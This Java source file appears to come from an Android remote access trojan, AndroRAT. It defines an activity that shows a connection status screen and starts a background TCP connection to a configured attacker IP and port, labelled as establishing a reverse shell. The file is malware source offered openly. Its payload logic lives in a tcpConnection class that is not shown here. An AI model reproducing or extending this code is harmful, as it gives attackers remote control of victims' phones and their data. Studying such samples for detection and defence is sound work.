package com.example.reverseshell2;

import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Context;
import android.os.AsyncTask;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.TextView;
import android.widget.ProgressBar;
import android.widget.LinearLayout;
import android.graphics.Color;

public class ConnectionStatusActivity extends AppCompatActivity {

    private TextView connectionStatusText;
    private TextView connectionUrlText;
    private TextView connectionInfoText;
    private ProgressBar progressBar;
    private Activity activity = this;
    private Context context;
    private static String TAG = "ConnectionStatusActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Create layout programmatically
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(40, 40, 40, 40);
        layout.setBackgroundColor(Color.parseColor("#1a1a1a"));
        
        // Title
        TextView titleText = new TextView(this);
        titleText.setText("AndroRAT Connection Status");
        titleText.setTextSize(24);
        titleText.setTextColor(Color.parseColor("#00ff00"));
        titleText.setPadding(0, 0, 0, 30);
        layout.addView(titleText);
        
        // Status indicator
        connectionStatusText = new TextView(this);
        connectionStatusText.setText("Status: Connecting...");
        connectionStatusText.setTextSize(16);
        connectionStatusText.setTextColor(Color.parseColor("#ffff00"));
        connectionStatusText.setPadding(0, 0, 0, 20);
        layout.addView(connectionStatusText);
        
        // Progress bar
        progressBar = new ProgressBar(this);
        progressBar.setPadding(0, 0, 0, 30);
        layout.addView(progressBar);
        
        // Connection URL
        connectionUrlText = new TextView(this);
        connectionUrlText.setText("Server: " + config.IP + ":" + config.port);
        connectionUrlText.setTextSize(14);
        connectionUrlText.setTextColor(Color.parseColor("#ffffff"));
        connectionUrlText.setPadding(0, 10, 0, 20);
        layout.addView(connectionUrlText);
        
        // Connection info
        connectionInfoText = new TextView(this);
        connectionInfoText.setText("Attempting to establish reverse shell connection...");
        connectionInfoText.setTextSize(12);
        connectionInfoText.setTextColor(Color.parseColor("#cccccc"));
        connectionInfoText.setPadding(0, 10, 0, 10);
        layout.addView(connectionInfoText);
        
        setContentView(layout);
        context = getApplicationContext();
        
        // Start connection
        startConnection();
    }
    
    private void startConnection() {
        new tcpConnection(activity, context) {
            @Override
            protected void onProgressUpdate(Void... values) {
                super.onProgressUpdate(values);
            }
            
            @Override
            protected Void doInBackground(String... strings) {
                try {
                    Log.d(TAG, "Attempting connection to " + config.IP + ":" + config.port);
                    return super.doInBackground(strings);
                } catch (Exception e) {
                    Log.e(TAG, "Connection error: " + e.getMessage());
                    runOnUiThread(() -> {
                        connectionStatusText.setText("Status: Connection Failed");
                        connectionStatusText.setTextColor(Color.parseColor("#ff0000"));
                        connectionInfoText.setText("Error: " + e.getMessage());
                        progressBar.setVisibility(View.GONE);
                    });
                    return null;
                }
            }
            
            @Override
            protected void onPostExecute(Void result) {
                super.onPostExecute(result);
                runOnUiThread(() -> {
                    if (tcpConnection.out != null) {
                        connectionStatusText.setText("Status: Connected ✓");
                        connectionStatusText.setTextColor(Color.parseColor("#00ff00"));
                        connectionInfoText.setText("Successfully connected to server!");
                        progressBar.setVisibility(View.GONE);
                    }
                });
            }
        }.execute(config.IP, config.port);
    }
}
